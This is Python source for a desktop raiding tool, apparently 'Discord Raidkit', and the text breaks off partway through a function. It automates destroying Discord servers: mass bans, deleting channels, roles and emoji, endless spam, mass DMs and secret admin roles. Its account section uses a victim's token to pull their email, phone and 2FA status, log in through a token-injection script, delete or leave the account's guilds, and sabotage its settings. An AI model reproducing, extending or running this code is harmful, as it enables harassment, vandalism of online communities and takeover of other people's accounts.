import asyncio
from bs4 import BeautifulSoup
import discord
import json
import logging
import os
import random
import re
import requests
import sys
import webbrowser
from datetime import datetime
from discord.ext import commands, tasks
from itertools import cycle
from selenium import webdriver

from PyQt6 import QtWidgets
from qasync import QEventLoop, asyncSlot
from widgets.dr_window import Ui_MainWindow
from widgets.dr_dlg_admin import Ui_dlgAdmin
from widgets.dr_dlg_confirmation import Ui_dlgConfirmation
from widgets.dr_dlg_improper_token import Ui_dlgImproperToken
from widgets.dr_dlg_mass_nuke import Ui_dlgMassNuke
from widgets.dr_dlg_messages import Ui_dlgMessages
from widgets.dr_dlg_new_update import Ui_dlgNewUpdate
from widgets.dr_dlg_nicknames import Ui_dlgNicknames
from widgets.dr_dlg_nuke import Ui_dlgNuke
from widgets.dr_dlg_raid import Ui_dlgRaid
from widgets.dr_dlg_server import Ui_dlgServer
from widgets.dr_dlg_task_still_running import Ui_dlgTaskStillRunning
from widgets.dr_dlg_token import Ui_dlgToken

from cogs.shared.bot_err_and_config import BotErrAndConfig
from cogs.shared.status import Status

from cogs.anubis.surfing import Surfing
from cogs.anubis.raid_prevention import RaidPrevention
from cogs.anubis.moderation import Moderation
from cogs.anubis.anubis_help import AnubisHelp

from cogs.qetesh.images import Images
from cogs.qetesh.qetesh_help import QeteshHelp

VERSION = "2.0.1"
launched = False
launch_after_yes = False

config_data = {}
bot_starting = False
anubis_running = False
qetesh_running = False
osiris_running = False
leave_confirmation = False
stop_mass_nuke = False
halt_commands = False
guild_IDs = []
#friend_IDs = []
#channel_IDs = []
user_IDs = []
nicks = []
messages = []
channel_names = []
guild_ID = 0
user_ID = 0
channel_num = 0
rolename = ""
token = ""

logging.basicConfig(
    filename="errors.log",
    format="%(name)s - %(levelname)s - %(message)s - " +
    datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    level=logging.ERROR
)


class MainWindow(QtWidgets.QMainWindow, Ui_MainWindow):
    def __init__(self, parent=None) -> None:

        global config_data
        super().__init__(parent)
        self.setupUi(self)

        # Check for new update

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        }
        url = f"https://github.com/the-cult-of-integral/discord-raidkit/releases/latest"
        r = requests.get(url, headers=headers)
        soup = str(BeautifulSoup(r.text, 'html.parser'))
        latest_release = re.search(
            r"Release Discord Raidkit v(\d.\d.\d)", soup).group(1)
        if latest_release != VERSION:
            dlg = NewUpdateDialog()
            dlg.show()
            dlg.exec()

        self.client = ""

        # Buttons

        self.bot_btns_off(True)
        self.btnAStopCmds.setDisabled(True)
        self.btnQStopCmds.setDisabled(True)
        self.btnNextPage.setDisabled(False)
        self.btnPrevPage.setDisabled(False)
        self.btnStartAnubis.setDisabled(False)
        self.btnStartQetesh.setDisabled(False)
        self.btnOFindInfo.setDisabled(False)
        self.btnOLogIntoAccount.setDisabled(False)
        self.btnONukeAccount.setDisabled(False)

        self.btnViewGithub.clicked.connect(self.btn_view_github)
        self.btnClearLogs.clicked.connect(self.btn_clear_logs)
        self.btnConfigure.clicked.connect(self.btn_configure_clicked)
        self.btnNextPage.clicked.connect(self.btn_next_page_clicked)
        self.btnPrevPage.clicked.connect(self.btn_prev_page_clicked)
        self.btnStartAnubis.clicked.connect(self.btn_start_anubis)
        self.btnStartQetesh.clicked.connect(self.btn_start_qetesh)
        self.btnEndAnubis.clicked.connect(self.btn_end_bot)
        self.btnEndQetesh.clicked.connect(self.btn_end_bot)
        self.btnANickAll.clicked.connect(self.nick_all)
        self.btnAMsgAll.clicked.connect(self.msg_all)
        self.btnASpam.clicked.connect(self.spam)
        self.btnACpurge.clicked.connect(self.cpurge)
        self.btnAAdmin.clicked.connect(self.admin)
        self.btnARaid.clicked.connect(self.raid)
        self.btnANuke.clicked.connect(self.nuke)
        self.btnAMassNuke.clicked.connect(self.mass_nuke)
        self.btnALeave.clicked.connect(self.leave)
        self.btnAMassLeave.clicked.connect(self.mass_leave)
        self.btnAStopCmds.clicked.connect(self.btn_stop_cmd)
        self.btnQNickAll.clicked.connect(self.nick_all)
        self.btnQMsgAll.clicked.connect(self.msg_all)
        self.btnQSpam.clicked.connect(self.spam)
        self.btnQCpurge.clicked.connect(self.cpurge)
        self.btnQAdmin.clicked.connect(self.admin)
        self.btnQRaid.clicked.connect(self.raid)
        self.btnQNuke.clicked.connect(self.nuke)
        self.btnQMassNuke.clicked.connect(self.mass_nuke)
        self.btnQLeave.clicked.connect(self.leave)
        self.btnQMassLeave.clicked.connect(self.mass_leave)
        self.btnQStopCmds.clicked.connect(self.btn_stop_cmd)
        self.btnOFindInfo.clicked.connect(self.find_info)
        self.btnOLogIntoAccount.clicked.connect(self.login)
        self.btnONukeAccount.clicked.connect(self.nuke_account)

        # Configuration

        if os.path.isfile("config_data.json"):
            with open("config_data.json", "r") as f:
                config_data = json.load(f)
            self.txtBotToken.setText(config_data["token"])
            self.txtPrefix.setText(config_data["prefix"])
        else:
            config_data["token"] = ""
            config_data["prefix"] = ""
            with open("config_data.json", "w") as f:
                json.dump(config_data, f, indent=4)

    def closeEvent(self, event) -> None:
        if type(self.client) is Anubis or type(self.client) is Qetesh or osiris_running:
            dlg = TaskStillRunningDialog()
            dlg.show()
            dlg.exec()
            event.ignore()
        else:
            event.accept()

    def btn_configure_clicked(self) -> None:
        """Set config_data.json; data used to set up bots.
        """
        global config_data
        if not self.txtBotToken.text().strip().replace(" ", ""):
            config_data["token"] = ""
        else:
            config_data["token"] = self.txtBotToken.text()
        if not self.txtPrefix.text().strip().replace(" ", ""):
            config_data["prefix"] = ""
        else:
            config_data["prefix"] = self.txtPrefix.text()
        with open("config_data.json", "w") as f:
            json.dump(config_data, f, indent=4)

    def btn_view_github(self) -> None:
        webbrowser.open(
            "https://github.com/the-cult-of-integral/discord-raidkit", new=2)

    def btn_clear_logs(self) -> None:
        with open("errors.log", "w") as f:
            pass
        with open("con_log.txt", "w") as f:
            pass

    def btn_stop_cmd(self) -> None:
        global halt_commands
        halt_commands = True
        self.btnAStopCmds.setDisabled(True)
        self.btnQStopCmds.setDisabled(True)

    # Anubis Management

    @asyncSlot()
    async def btn_start_anubis(self) -> None:
        """Start anubis using data from config_data.json.
        """
        global bot_starting
        global anubis_running
        intents = discord.Intents.default()
        intents.members = True
        if not config_data["prefix"]:
            prefix = "a!"
        else:
            prefix = config_data["prefix"]
        self.client = Anubis(
            command_prefix=prefix,
            intents=intents,
            self_bot=False,
        )
        self.client.add_cog(BotErrAndConfig(self.client))
        self.client.add_cog(Status(self.client))
        self.client.add_cog(Surfing(self.client))
        self.client.add_cog(RaidPrevention(self.client))
        self.client.add_cog(Moderation(self.client))
        self.client.add_cog(AnubisHelp(self.client))
        try:
            self.bot_btns_off(False)
            self.btnStartAnubis.setDisabled(True)
            self.btnAStopCmds.setDisabled(True)
            bot_starting = True
            try:
                anubis_running = True
                await self.client.start(config_data["token"])
                bot_starting = False
            except discord.errors.LoginFailure as e:
                await self.client.close()
                self.client = ""
                anubis_running = False
                bot_starting = False
                self.bot_btns_off(True)
                self.page_btns_off(True)
                dlg = ImproperTokenDialog()
                dlg.show()
                dlg.exec()
                self.btnStartQetesh.setDisabled(False)
                self.btnStartAnubis.setDisabled(False)
                self.page_btns_off(False)
            except BaseException as e:
                await self.client.close()
                self.client = ""
                logging.error(f"err starting anubis: {e}")
                bot_starting = False
                anubis_running = False
                self.bot_btns_off(True)
                self.btnStartAnubis.setDisabled(False)
                self.btnStartQetesh.setDisabled(False)
                self.page_btns_off(False)
        except:
            bot_starting = False
            anubis_running = False

    # Qetesh Management

    @asyncSlot()
    async def btn_start_qetesh(self) -> None:
        """Start qetesh using data from config_data.json.
        """
        global bot_starting
        global qetesh_running
        intents = discord.Intents.default()
        intents.members = True
        if not config_data["prefix"]:
            prefix = "q!"
        else:
            prefix = config_data["prefix"]
        self.client = Qetesh(
            command_prefix=prefix,
            intents=intents,
            self_bot=False,
        )
        self.client.add_cog(BotErrAndConfig(self.client))
        self.client.add_cog(Status(self.client))
        self.client.add_cog(Images(self.client))
        self.client.add_cog(QeteshHelp(self.client))
        try:
            self.bot_btns_off(False)
            self.btnStartQetesh.setDisabled(True)
            self.btnQStopCmds.setDisabled(True)
            bot_starting = True
            try:
                qetesh_running = True
                await self.client.start(config_data["token"])
                bot_starting = False
            except discord.errors.LoginFailure as e:
                await self.client.close()
                self.client = ""
                qetesh_running = False
                bot_starting = False
                self.bot_btns_off(True)
                self.page_btns_off(True)
                dlg = ImproperTokenDialog()
                dlg.show()
                dlg.exec()
                self.btnStartQetesh.setDisabled(False)
                self.btnStartAnubis.setDisabled(False)
                self.page_btns_off(False)
            except BaseException as e:
                await self.client.close()
                self.client = ""
                logging.error(f"err starting qetesh: {e}")
                qetesh_running = False
                bot_starting = False
                self.bot_btns_off(True)
                self.btnStartQetesh.setDisabled(False)
                self.btnStartAnubis.setDisabled(False)
                self.page_btns_off(False)
        except:
            bot_starting = False
            qetesh_running = False

    @asyncSlot()
    async def btn_end_bot(self) -> None:
        global anubis_running
        global qetesh_running
        if bot_starting:
            return
        elif anubis_running:
            anubis_running = False
        elif qetesh_running:
            qetesh_running = False
        try:
            await self.client.close()
            self.client = ""
            self.bot_btns_off(True)
            self.btnStartAnubis.setDisabled(False)
            self.btnStartQetesh.setDisabled(False)
            self.btnNextPage.setDisabled(False)
            self.btnPrevPage.setDisabled(False)
        except:
            pass

    # Page Management (drStkWid)

    def btn_next_page_clicked(self) -> None:
        if not anubis_running and not qetesh_running:
            if self.drStkWid.currentIndex() == 3:
                self.drStkWid.setCurrentIndex(0)
            else:
                self.drStkWid.setCurrentIndex(
                    self.drStkWid.currentIndex() + 1
                )
        else:
            if self.drStkWid.currentIndex() == 1 or self.drStkWid.currentIndex() == 2:
                self.drStkWid.setCurrentIndex(3)
            elif self.drStkWid.currentIndex() == 3:
                if anubis_running:
                    self.drStkWid.setCurrentIndex(1)
                elif qetesh_running:
                    self.drStkWid.setCurrentIndex(2)

    def btn_prev_page_clicked(self) -> None:
        if not anubis_running and not qetesh_running:
            if self.drStkWid.currentIndex() == 0:
                self.drStkWid.setCurrentIndex(3)
            else:
                self.drStkWid.setCurrentIndex(
                    self.drStkWid.currentIndex() - 1
                )
        else:
            if self.drStkWid.currentIndex() == 1 or self.drStkWid.currentIndex() == 2:
                self.drStkWid.setCurrentIndex(3)
            elif self.drStkWid.currentIndex() == 3:
                if anubis_running:
                    self.drStkWid.setCurrentIndex(1)
                elif qetesh_running:
                    self.drStkWid.setCurrentIndex(2)

    def page_btns_off(self, bool) -> None:
        self.btnNextPage.setDisabled(bool)
        self.btnPrevPage.setDisabled(bool)

    # Other Button Management

    def bot_btns_off(self, bool) -> None:
        self.btnNextPage.setDisabled(bool)
        self.btnPrevPage.setDisabled(bool)
        self.btnStartAnubis.setDisabled(bool)
        self.btnEndAnubis.setDisabled(bool)
        self.btnAAdmin.setDisabled(bool)
        self.btnACpurge.setDisabled(bool)
        self.btnALeave.setDisabled(bool)
        self.btnAMassLeave.setDisabled(bool)
        self.btnAMassNuke.setDisabled(bool)
        self.btnAMsgAll.setDisabled(bool)
        self.btnANickAll.setDisabled(bool)
        self.btnANuke.setDisabled(bool)
        self.btnARaid.setDisabled(bool)
        self.btnASpam.setDisabled(bool)
        self.btnAStopCmds.setDisabled(bool)
        self.btnStartQetesh.setDisabled(bool)
        self.btnEndQetesh.setDisabled(bool)
        self.btnQAdmin.setDisabled(bool)
        self.btnQCpurge.setDisabled(bool)
        self.btnQLeave.setDisabled(bool)
        self.btnQMassLeave.setDisabled(bool)
        self.btnQMassNuke.setDisabled(bool)
        self.btnQMsgAll.setDisabled(bool)
        self.btnQNickAll.setDisabled(bool)
        self.btnQNuke.setDisabled(bool)
        self.btnQRaid.setDisabled(bool)
        self.btnQSpam.setDisabled(bool)
        self.btnQStopCmds.setDisabled(bool)

    def osiris_btns_off(self, bool) -> None:
        self.btnOFindInfo.setDisabled(bool)
        self.btnOLogIntoAccount.setDisabled(bool)
        self.btnONukeAccount.setDisabled(bool)

    # Anubis/Qetesh Commands

    def end_of_cmd(self) -> None:
        self.page_btns_off(False)
        self.bot_btns_off(False)
        self.btnStartAnubis.setDisabled(True)
        self.btnStartQetesh.setDisabled(True)
        self.btnAStopCmds.setDisabled(True)
        self.btnQStopCmds.setDisabled(True)

    @asyncSlot()
    async def nick_all(self) -> None:
        """Nickname every member in a guild.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = NicknamesDialog()
        dlg.show()
        dlg.exec()
        dlg.close()
        if not guild_ID or not nicks:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)
                g = discord.utils.get(self.client.guilds, id=guild_ID)

                if len(nicks) == 1:
                    for member in g.members:
                        if halt_commands:
                            break
                        try:
                            await member.edit(nick=nicks[0])
                        except discord.errors.HTTPException as e:
                            logging.error(f"A/Q: nick_all: {e}")
                else:
                    for member in g.members:
                        if halt_commands:
                            break
                        try:
                            await member.edit(nick=random.choice(nicks))
                        except discord.errors.HTTPException as e:
                            logging.error(f"A/Q: nick_all: {e}")

                halt_commands = False
                self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: nick_all: {e}")
                halt_commands = False
                self.end_of_cmd()

    @asyncSlot()
    async def msg_all(self) -> None:
        """Message every member in a guild.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = MessagesDialog()
        dlg.show()
        dlg.exec()
        if not guild_ID or not messages:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)
                g = discord.utils.get(self.client.guilds, id=guild_ID)

                if len(messages) == 1:
                    for member in g.members:
                        if halt_commands:
                            break
                        try:
                            if member.id == self.client.user.id:
                                pass
                            else:
                                await member.send(messages[0])
                        except discord.errors.HTTPException as e:
                            logging.error(f"A/Q: msg_all: {e}")
                else:
                    for member in g.members:
                        if halt_commands:
                            break
                        try:
                            if member.id == self.client.user.id:
                                pass
                            else:
                                await member.send(random.choice(messages))
                        except discord.errors.HTTPException as e:
                            logging.error(f"A/Q: msg_all: {e}")

                halt_commands = False
                self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: msg_all: {e}")
                halt_commands = False
                self.end_of_cmd()

    @asyncSlot()
    async def spam(self) -> None:
        """Spam every channel in a guild.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = MessagesDialog()
        dlg.show()
        dlg.exec()
        if not guild_ID or not messages:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)
                g = discord.utils.get(self.client.guilds, id=guild_ID)

                def check_halt(none) -> bool:
                    return halt_commands

                if len(messages) == 1:

                    async def spam_text() -> None:
                        self.btnEndAnubis.setDisabled(False)
                        self.btnEndQetesh.setDisabled(False)
                        while True:
                            for channel in g.text_channels:
                                try:
                                    await channel.send(messages[0])
                                except discord.errors.HTTPException as e:
                                    logging.error(f"A/Q: spam: {e}")

                    if not halt_commands:
                        spam_task = self.client.loop.create_task(spam_text())
                        await self.client.wait_for("message", check=check_halt)
                        spam_task.cancel()
                else:

                    async def spam_text() -> None:
                        self.btnEndAnubis.setDisabled(False)
                        self.btnEndQetesh.setDisabled(False)
                        while True:
                            for channel in g.text_channels:
                                try:
                                    await channel.send(random.choice(messages))
                                except discord.errors.HTTPException as e:
                                    logging.error(f"A/Q: spam: {e}")

                    if not halt_commands:
                        spam_task = self.client.loop.create_task(spam_text())
                        await self.client.wait_for("message", check=check_halt)
                        spam_task.cancel()

                halt_commands = False
                self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: spam: {e}")
                halt_commands = False
                self.end_of_cmd()

    @asyncSlot()
    async def cpurge(self) -> None:
        """Delete every channel in a guild.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = ServerDialog()
        dlg.show()
        dlg.exec()
        if not guild_ID:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)
                g = discord.utils.get(self.client.guilds, id=guild_ID)

                for c in g.channels:
                    if halt_commands:
                        break
                    try:
                        await c.delete()
                    except discord.errors.HTTPException as e:
                        logging.error(f"A/Q: cpurge: {e}")

                halt_commands = False
                self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: cpurge: {e}")
                halt_commands = False
                self.end_of_cmd()

    @asyncSlot()
    async def admin(self) -> None:
        """Give a member in a server a role with administrator permissions.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = AdminDialog()
        dlg.show()
        dlg.exec()
        if not guild_ID:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)
                g = discord.utils.get(self.client.guilds, id=guild_ID)

                await g.create_role(
                    name=rolename,
                    permissions=discord.Permissions.all()
                )
                role = discord.utils.get(g.roles, name=rolename)
                member = g.get_member(user_ID)
                try:
                    await member.add_roles(role)
                except discord.errors.HTTPException as e:
                    logging.error(f"A/Q: admin: {e}")

                halt_commands = False
                self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: admin: {e}")
                halt_commands = False
                self.end_of_cmd()

    @asyncSlot()
    async def raid(self) -> None:
        """Raid a guild
        Note: can be quite buggy!
        """
        ###
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = RaidDialog()
        dlg.show()
        dlg.exec()
        if not guild_ID or not nicks \
            or not channel_names or not channel_num \
            or not messages:
            self.end_of_cmd()
            return
        try:
            self.btnAStopCmds.setDisabled(False)
            g = discord.utils.get(self.client.guilds, id=guild_ID)

            # Delete all channels

            for c in g.channels:
                if halt_commands:
                    break
                try:
                    await c.delete()
                except discord.Forbidden:
                    continue

            # Delete all roles

            roles = g.roles
            roles.pop(0)
            for r in roles:
                if halt_commands:
                    break
                if g.me.roles[-1] > r:
                    try:
                        await r.delete()
                    except BaseException as e:
                        logging.error(f"A/Q: raid: {e}")
                        continue
                else:
                    break

            # Nickname all members

            for m in g.members:
                if halt_commands:
                    break
                try:
                    nick = random.choice(nicks)
                    await m.edit(nick=nick)
                except BaseException as e:
                    logging.error(f"A/Q: raid: {e}")
                    continue

            # Create i number of named channels

            for i in range(channel_num):
                if halt_commands:
                    break
                try:
                    name = random.choice(channel_names)
                    await g.create_text_channel(name)
                except BaseException as e:
                    logging.error(f"A/Q: raid: {e}")
                    continue

            # Raid all text channels

            def check_halt(none) -> bool:
                return halt_commands

            if len(messages) == 1:

                async def spam_text() -> None:
                    self.btnEndAnubis.setDisabled(False)
                    self.btnEndQetesh.setDisabled(False)
                    while True:
                        for channel in g.text_channels:
                            try:
                                await channel.send(messages[0])
                            except discord.errors.HTTPException as e:
                                logging.error(f"A/Q: spam: {e}")

                if not halt_commands:
                    spam_task = self.client.loop.create_task(spam_text())
                    await self.client.wait_for("message", check=check_halt)
                    spam_task.cancel()
            else:

                async def spam_text() -> None:
                    self.btnEndAnubis.setDisabled(False)
                    self.btnEndQetesh.setDisabled(False)
                    while True:
                        for channel in g.text_channels:
                            try:
                                await channel.send(random.choice(messages))
                            except discord.errors.HTTPException as e:
                                logging.error(f"A/Q: spam: {e}")

                if not halt_commands:
                    spam_task = self.client.loop.create_task(spam_text())
                    await self.client.wait_for("message", check=check_halt)
                    spam_task.cancel()

            halt_commands = False
            self.end_of_cmd()

        except BaseException as e:
            logging.error(f"A/Q: raid: {e}")
            halt_commands = False
            self.end_of_cmd()

    @asyncSlot()
    async def nuke(self) -> None:
        """Nuke a server.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = NukeDialog()
        dlg.show()
        dlg.exec()
        if not guild_ID:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)
                g = discord.utils.get(self.client.guilds, id=guild_ID)

                # Ban all members

                for member in g.members:
                    if halt_commands:
                        break
                    if member.id not in user_IDs:
                        try:
                            await member.ban()
                        except discord.errors.HTTPException as e:
                            logging.error(f"A/Q: nuke: {e}")

                # Delete all channels

                for c in g.channels:
                    if halt_commands:
                        break
                    try:
                        await c.delete()
                    except discord.errors.HTTPException as e:
                        logging.error(f"A/Q: nuke: {e}")

                # Delete all roles

                roles = g.roles
                roles.pop(0)
                for role in roles:
                    if halt_commands:
                        break
                    if g.me.roles[-1] > role:
                        try:
                            await role.delete()
                        except discord.errors.HTTPException as e:
                            logging.error(f"A/Q: nuke: {e}")

                # Delete all emoji

                for emoji in g.emojis:
                    if halt_commands:
                        break
                    try:
                        await emoji.delete()
                    except discord.errors.HTTPException as e:
                        logging.error(f"A/Q: nuke: {e}")

                halt_commands = False
                self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: nuke: {e}")
                halt_commands = False
                self.end_of_cmd()

    @asyncSlot()
    async def mass_nuke(self) -> None:
        """Nuke all servers bot is in.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = MassNukeDialog()
        dlg.show()
        dlg.exec()
        if stop_mass_nuke:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)

                for g in self.client.guilds:
                    if halt_commands:
                        break

                    # Ban all members

                    for member in g.members:
                        if halt_commands:
                            break
                        if member.id not in user_IDs:
                            try:
                                await member.ban()
                            except discord.errors.HTTPException as e:
                                logging.error(f"A/Q: mass_nuke: {e}")

                    # Delete all channels

                    for c in g.channels:
                        if halt_commands:
                            break
                        try:
                            await c.delete()
                        except discord.errors.HTTPException as e:
                            logging.error(f"A/Q: mass_nuke: {e}")

                    # Delete all roles

                    roles = g.roles
                    roles.pop(0)
                    for role in roles:
                        if halt_commands:
                            break
                        if g.me.roles[-1] > role:
                            try:
                                await role.delete()
                            except discord.errors.HTTPException as e:
                                logging.error(f"A/Q: mass_nuke: {e}")

                    # Delete all emoji

                    for emoji in g.emojis:
                        if halt_commands:
                            break
                        try:
                            await emoji.delete()
                        except discord.errors.HTTPException as e:
                            logging.error(f"A/Q: mass_nuke: {e}")

                    halt_commands = False
                    self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: mass_nuke: {e}")
                halt_commands = False
                self.end_of_cmd()

    @asyncSlot()
    async def leave(self) -> None:
        """Leave a server.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = ServerDialog()
        dlg.show()
        dlg.exec()
        if not guild_ID:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)
                g = discord.utils.get(self.client.guilds, id=guild_ID)

                try:
                    await g.leave()
                except discord.errors.HTTPException as e:
                    logging.error(f"A/Q: leave: {e}")

                halt_commands = False
                self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: leave: {e}")
                halt_commands = False
                self.end_of_cmd()

    @asyncSlot()
    async def mass_leave(self) -> None:
        """Leave a server.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = ConfirmationDialog()
        dlg.show()
        dlg.exec()
        if not leave_confirmation:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)

                for g in self.client.guilds:
                    if halt_commands:
                        break
                    try:
                        await g.leave()
                    except discord.errors.HTTPException as e:
                        logging.error(f"A/Q: mass_leave: {e}")

                halt_commands = False
                self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: mass_leave: {e}")
                halt_commands = False
                self.end_of_cmd()

    # Osiris

    def find_info(self) -> None:
        """Find and display the following info about a discord token:
        - user_ID
        - username
        - 2FA; is it enabled or disabled?
        - account email
        - account phone number
        """
        global osiris_running
        osiris_running = True
        self.osiris_btns_off(True)
        self.page_btns_off(True)
        dlg = TokenDialog()
        dlg.show()
        dlg.exec()
        if token == "False":
            self.osiris_btns_off(False)
            self.page_btns_off(False)
            osiris_running = False
            return
        try:
            headers = {
                "Authorization": token,
                "Content-Type": "application/json"
            }
            r = requests.get(
                "https://discord.com/api/v6/users/@me",
                headers=headers)
            if r.status_code == 200:
                r = r.json()
                username = f"{r['username']}#{r['discriminator']}"
                userID = r["id"]
                twoFA = r["mfa_enabled"]
                email = r["email"]
                phone = r["phone"]
                self.txtOUserID.setText(f"{userID}")
                self.txtOUsername.setText(f"{username}")
                self.txtO2FA.setText(f"{twoFA}")
                self.txtOEmail.setText(f"{email}")
                self.txtOPhoneNum.setText(f"{phone}")
                self.osiris_btns_off(False)
                self.page_btns_off(False)
                osiris_running = False
            else:
                self.txtOUserID.setText("Find Info Fail: Invalid Token")
                self.txtOUsername.setText("Find Info Fail: Invalid Token")
                self.txtO2FA.setText("Find Info Fail: Invalid Token")
                self.txtOEmail.setText("Find Info Fail: Invalid Token")
                self.txtOPhoneNum.setText("Find Info Fail: Invalid Token")
                self.osiris_btns_off(False)
                self.page_btns_off(False)
                osiris_running = False
        except BaseException as e:
            logging.error(f"O: find_all(): {e}")
            self.osiris_btns_off(False)
            self.page_btns_off(False)
            osiris_running = False

    def login(self) -> None:
        """Login to a discord account via a token.
        """
        global osiris_running
        osiris_running = True
        self.osiris_btns_off(True)
        self.page_btns_off(True)
        dlg = TokenDialog()
        dlg.show()
        dlg.exec()
        if token == "False":
            self.osiris_btns_off(False)
            self.page_btns_off(False)
            osiris_running = False
            return
        try:
            headers = {
                "Authorization": token,
                "Content-Type": "application/json"
            }
            r = requests.get(
                "https://discord.com/api/v6/users/@me",
                headers=headers)
            if r.status_code == 200:
                webdriver.ChromeOptions.binary_location = r"browser\chrome.exe"
                opts = webdriver.ChromeOptions()
                opts.add_experimental_option("detach", True)
                driver = webdriver.Chrome(
                    r"browser\chromedriver.exe", options=opts)
                script = """
                        function login(token) {
                        setInterval(() => {
                        document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                        }, 50);
                        setTimeout(() => {
                        location.reload();
                        }, 2500);
                        }
                        """
                driver.get("https://discord.com/login")
                driver.execute_script(script + f'\nlogin("{token}")')
                self.osiris_btns_off(False)
                self.page_btns_off(False)
                osiris_running = False
            else:
                self.txtOUserID.setText("Login Fail: Invalid Token")
                self.txtOUsername.setText("Login Fail: Invalid Token")
                self.txtO2FA.setText("Login Fail: Invalid Token")
                self.txtOEmail.setText("Login Fail: Invalid Token")
                self.txtOPhoneNum.setText("Login Fail: Invalid Token")
                self.osiris_btns_off(False)
                self.page_btns_off(False)
                osiris_running = False
        except BaseException as e:
            logging.error(f"O: login(): {e}")
            self.osiris_btns_off(False)
            self.page_btns_off(False)
            osiris_running = False

    def nuke_account(self) -> None:
        """Nuke a discord account via a token.
        """
        global guild_IDs
        global osiris_running
        # global friend_IDs
        # global channel_IDs

        def nuke_requests(headers) -> None:
            headers = headers

            """
            Channel POST disabled; v1.5.7 and below used self-bots to gather IDs
            but I couldn't figure out using self bots on the most recent version of
            discord.py — didn't find any other means of gathering channel and
            friend IDs.

            Do YOU like developing in Python, and like developing discord raiding tools?
            Maybe you can contribute a fix by submiting a pull request!

            https://github.com/the-cult-of-integral/discord-raidkit

            for ids in channel_IDs:
                try:
                    requests.post(
                            f'https://discord.com/api/v8/channels/{ids}/messages', 
                            headers=headers, 
                            data = {
                                "content": "This account has been hacked! Don't believe me? Check out the GitHub! 
https://github.com/the-cult-of-integral/discord-raidkit"
                            }
                        )
                except BaseException as e:
                    logging.error(f"O: nuke_account(): {e}")"""

            for guild in guild_IDs:
                try:
                    requests.delete(
                        f'https://discord.com/api/v8/guilds/{guild}', headers=headers
                    )
                except BaseException as e:
                    logging.error(f"O: nuke_account(): {e}")

            for guild in guild_IDs:
                try:
                    requests.delete(
                        f'https://discord.com/api/v6/users/@me/guilds/{guild}',
                        headers=headers
                    )
                except BaseException as e:
                    logging.error(f"O: nuke_account(): {e}")

            """
            Friend POST disabled; v1.5.7 and below used self-bots to gather IDs
            but I couldn't figure out using self bots on the most recent version of
            discord.py — didn't find any other means of gathering channel and
            friend IDs.

            Do YOU like developing in Python, and like developing discord raiding tools?
            Maybe you can contribute a fix by submiting a pull request!

            https://github.com/the-cult-of-integral/discord-raidkit

            for friend in friend_IDs:
                try:
                    requests.delete(
                        f'https://discord.com/api/v6/users/@me/relationships/{friend}',
                        headers=headers
                        )
                except BaseException as e:
                    logging.error(f"O: nuke_account(): {e}")"""

            for i in range(10):
                try:
                    payload = {
                        'name': 'Hacked by the-cult-of-integral\'s Discord Raidkit!',
                        'region': 'europe',
                        'icon': None,
                        'channels': None
                    }
                    requests.post(
                        'https://discord.com/api/v6/guilds',
                        headers=headers,
                        json=payload
                    )
                except BaseException as e:
                    logging.error(f"O: nuke_account(): {e}")

            settings = {
                "locale": "ja",
                "show_current_game": False,
                "default_guilds_restricted": True,
                "inline_attatchment_media": False,
                "inline_embed_media": False,
                "gif_auto_play": False,
                "render_embeds": False,
                "render_reactions": False,
                "animate_emoji": False,
                "enable_tts_command": False,
                "message_display_compact": True,
                "convert_emoticons": False,
                "explicit_content_filter": 0,
                "disable_games_tab": True,
                "theme": "light",
                "detect_platform_accounts": False,
                "stream_notifications_enabled": False,
                "animate_stickers": False,
                "view_nsfw_guilds": True,
            }

            requests.patch(
                "https://discord.com/api/v8/users/@me/settings",
                headers=headers,
                json=settings
            )
            return

        osiris_running = True
        self.osiris_btns_off(True)
        self.page_btns_off(True)

        dlg = TokenDialog()
        dlg.show()
        dlg.exec()
        if token == "False":
            self.osiris_btns_off(False)
            self.page_btns_off(False)
            osiris_running = False
            return
        try:
            headers = {
                "Authorization": token,
                "Content-Type": "application/json"
            }
            r = requests.get(
                "https://discord.com/api/v6/users/@me",
                headers=headers
            )
            if r.status_code == 200:

                # Attempt to IDs of guilds from settings response (used to make account leave every guild).

                headers = {
                    "Authorization": token,
